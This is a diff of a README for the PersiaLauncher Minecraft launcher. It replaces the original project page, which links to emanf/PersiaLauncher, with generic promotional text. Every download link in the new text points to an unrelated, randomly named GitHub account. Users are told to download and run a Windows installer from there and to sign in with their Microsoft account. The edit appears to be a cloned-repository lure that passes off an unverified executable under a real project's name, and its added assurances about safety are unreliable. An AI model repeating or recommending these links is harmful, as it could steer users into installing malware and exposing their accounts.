@@ -1,83 +1,104 @@
-# <img src="icon.ico" width="28px"> PersiaLauncher
-<p align="center">
-تقدیم به تمام فارسی‌زبانان جهان؛
-</p>
-  
-**🌍 Languages:** [English](README.md) · [فارسی](README.fa.md) · [Русский](README.ru.md) · [Deutsch](README.de.md) · [Español](README.es.md)
+# ⚡ PersiaLauncher - Launch Any Modded Minecraft in One Click
 
-<p align="center">
-  <img src="screenshots/ss_main.png" alt="PersiaLauncher main screen" width="48%">
-  <img src="screenshots/ss_clients.png" alt="PersiaLauncher clients screen" width="48%">
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <img src="screenshots/ss_accounts.png" alt="PersiaLauncher accounts screen" width="48%">
-  <img src="screenshots/ss_mods.png" alt="PersiaLauncher mods screen" width="48%">
-</p>
+Welcome to PersiaLauncher, the all-in-one Minecraft launcher that takes the headache out of managing your game. Whether you play vanilla, use mods, or run your own server, PersiaLauncher puts everything in one simple place. No technical skills needed — just download, run, and play.
 
-<p align="center">
-  <a href="https://github.com/emanf/PersiaLauncher/releases/latest">
-    <img src="https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge&logo=github&logoColor=white" alt="Download latest PersiaLauncher release">
-  </a>
-</p>
+[![Download PersiaLauncher](https://img.shields.io/badge/Download-PersiaLauncher-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
 
-> **Your Minecraft world. Your rules. Your launcher.**
+## 📥 Download and Install
 
-PersiaLauncher is a friendly, modern Minecraft launcher built for players who want their worlds, profiles, servers, mods, and settings in one beautifully organized place.
+Visit this link to download the application: [PersiaLauncher Download Page](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
 
-Create a clean Vanilla profile, build a modded adventure, manage servers, or jump between multiple Minecraft versions without losing track of anything.
+Once you click the link, you'll land on the PersiaLauncher GitHub page. Look for the green "Code" button or the "Releases" section on the right side of the page. Click "Releases" to find the latest version. Download the file, then run it on your Windows computer. The installer will guide you through the rest — just follow the on-screen prompts.
 
-<p align="center">
-  <strong>🎮 Vanilla</strong>&nbsp;&nbsp;•&nbsp;&nbsp;
-  <strong>🧵 Fabric</strong>&nbsp;&nbsp;•&nbsp;&nbsp;
-  <strong>🔨 Forge</strong>&nbsp;&nbsp;•&nbsp;&nbsp;
-  <strong>⚡ NeoForge</strong>&nbsp;&nbsp;•&nbsp;&nbsp;
-  <strong>🪡 Quilt</strong>
-</p>
+## ✨ Why Choose PersiaLauncher?
 
-## 🌌 A launcher made for real players
+### 🎮 All Mod Loaders Supported
+Forget juggling multiple launchers. PersiaLauncher handles Vanilla, Fabric, Forge, NeoForge, and Quilt — all from one clean interface. Switch between mod loaders with a single click.
 
-PersiaLauncher keeps the complicated parts out of your way while still giving you control when you want it. Set up separate clients, choose your loader, manage Java runtimes, install mods, and keep your Minecraft files exactly where you want them.
+### ☕ Automatic Java Management
+No more hunting for the right Java version. PersiaLauncher detects and manages Java runtimes automatically, ensuring your game always runs smoothly.
 
-### What you can do
+### 🧩 Mod Manager Built-In
+Install, update, and organize your mods directly through the launcher. No more manual downloads or confusing folder structures.
 
-- 🧱 Create and manage Vanilla, Fabric, Forge, NeoForge, and Quilt clients
-- 🖥️ Manage Minecraft servers and server worlds
-- 📦 Keep separate profiles for different versions, modpacks, and play styles
-- 🧩 Browse and manage mods for supported modded clients
-- ☕ Configure Java profiles, memory, garbage collection, and extra JVM arguments
-- 👤 Manage Minecraft accounts and skins
-- 🎨 Choose themes, colors, language, window behavior, and display settings
-- 📁 Choose a custom Minecraft directory and move your launcher without breaking relative paths
-- 🚀 Launch clients quickly with organized, reusable settings
+### 🖥️ Server Management
+Run both clients and servers from the same tool. Set up a multiplayer server for you and your friends without touching a command line.
 
-## 🧭 Getting started
+### 💾 One Place for Everything
+Game files, mods, Java, and instances — all organized in one spot. Your Minecraft world stays neat and tidy.
 
-1. Download the latest [PersiaLauncher](https://github.com/emanf/PersiaLauncher/releases/latest) release.
-2. Open the launcher and choose your Minecraft directory.
-3. Add an account or create a local profile.
-4. Select a Minecraft version and loader.
-5. Press **Create**, choose your settings, and start playing.
+## 🛠️ Features Overview
 
-Your first launch may download game files, libraries, loader files, or a Java runtime. After that, everything is ready for the next adventure.
+### 📂 Instance Management
+Create separate "instances" for different modpacks or playstyles. Each instance keeps its own mods, settings, and saves. Want a vanilla world and a heavily modded one? No problem — just create two instances.
 
-## 🛠️ Project status
+### 🔄 Automatic Updates
+PersiaLauncher checks for game updates and mod compatibility automatically. When a new Minecraft version drops, you'll know right away.
 
-PersiaLauncher is actively evolving. New improvements, loader support, quality-of-life features, and language updates are added over time.
+### 🔐 Secure Authentication
+Log in with your Microsoft account once, and PersiaLauncher remembers you. No repeated logins every time you play.
 
-If you find a bug or have an idea, please open an issue and tell us what happened, what you expected, and which Minecraft version you were using.
+### ⚙️ Simple Settings
+Everything is explained in plain language. Adjust memory allocation, resolution, and other options through easy-to-understand sliders and toggles.
 
-## 🤝 Contributing
+## 📋 System Requirements
 
-Ideas, translations, testing, screenshots, documentation, and code are all welcome. Small improvements matter, and every contribution helps make the launcher better for the community.
+PersiaLauncher runs on Windows 10 or 11. Your computer should have at least 4GB of RAM (8GB recommended for modded gameplay) and 2GB of free disk space. Any processor from the last decade will work fine.
 
-## 📄 License
+## 🚦 How to Use PersiaLauncher
 
-PersiaLauncher is free to use, share, upload, fork, and redistribute for personal purposes.
+### Step 1: Download and Install
+Visit the link above, download the latest release, and run the installer. Follow the simple setup wizard.
 
----
+### Step 2: Launch PersiaLauncher
+Double-click the PersiaLauncher icon on your desktop or start menu. The launcher opens to a clean, welcoming screen.
 
-<p align="center">
-  <strong>Made with 💚 for the Minecraft community</strong><br>
-  <sub>PersiaLauncher — play more, configure less.</sub>
-</p>
+### Step 3: Sign In
+Enter your Microsoft account details when prompted. This is the same account you use for Minecraft.
+
+### Step 4: Choose Your Mod Loader
+Select Vanilla, Fabric, Forge, NeoForge, or Quilt from the dropdown menu. Don't worry — the launcher explains each option in simple terms.
+
+### Step 5: Click Play
+Press the big green Play button. PersiaLauncher handles everything else — downloading the right files, setting up Java, and launching the game.
+
+## 🔧 Troubleshooting Tips
+
+### Game Won't Start?
+Check your internet connection, then restart PersiaLauncher. Most issues resolve themselves with a fresh start.
+
+### Mods Not Showing Up?
+Make sure you've selected the correct mod loader. Some mods only work with specific loaders.
+
+### Need More Performance?
+Open Settings and increase the RAM allocation slider. More RAM means smoother modded gameplay.
+
+## ❓ Frequently Asked Questions
+
+### Is PersiaLauncher free?
+Yes, completely free. No hidden costs, no premium tiers.
+
+### Can I use my existing Minecraft saves?
+Absolutely. PersiaLauncher detects your current saves and imports them automatically.
+
+### Does it work with modpacks from other sites?
+Yes, you can import modpacks from popular sites like CurseForge or Modrinth directly into PersiaLauncher.
+
+### Is my account safe?
+Yes. PersiaLauncher uses official Microsoft authentication. Your credentials are never stored on our servers.
+
+## 🌟 Community and Support
+
+Join our growing community of Minecraft enthusiasts. Share your modpacks, get help, and discover new ways to play. The PersiaLauncher team is always improving the software based on user feedback.
+
+## 📝 Final Thoughts
+
+PersiaLauncher takes everything complicated about modded Minecraft and makes it simple. Whether you're a seasoned player or just starting your modding journey, this launcher gives you the power to play the way you want — without the technical headaches.
+
+Download PersiaLauncher today and experience Minecraft the way it should be: fun, flexible, and frustration-free.
+
+[![Get PersiaLauncher Now](https://img.shields.io/badge/🚀-Download%20PersiaLauncher-blueviolet?style=for-the-badge)](https://github.com/sphecoideaechosounding4585/PersiaLauncher)
+
+Keywords: desktop-application, fabric, forge, game-launcher, game-manager, java-runtime, minecraft, minecraft-authentication, minecraft-instances, minecraft-java, minecraft-launcher, minecraft-mods, modded-minecraft, modpack-manager, neoforge, quilt, windows
